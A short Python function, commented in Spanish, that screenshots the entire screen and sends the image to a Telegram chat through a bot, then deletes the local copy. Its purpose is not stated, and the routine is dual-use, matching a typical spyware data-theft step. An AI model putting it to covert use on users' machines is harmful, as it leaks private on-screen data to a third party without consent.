import telebot
import os
import tempfile
from PIL import ImageGrab

def sendEvidence(TELEGRAM_API_KEY, CHAT_ID):
    # Iniciar bot
    bot = telebot.TeleBot(TELEGRAM_API_KEY)

    # Captura de pantalla
    screenshot = ImageGrab.grab()

    # Guarda la captura en un archivo temporal
    with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:
        screenshot.save(temp_file.name)
        screenshot_file = temp_file.name

    # Envía la captura al chat
    with open(screenshot_file, 'rb') as photo:
        bot.send_photo(CHAT_ID, photo)

    # Elimina la captura después de enviarla
    os.remove(screenshot_file)
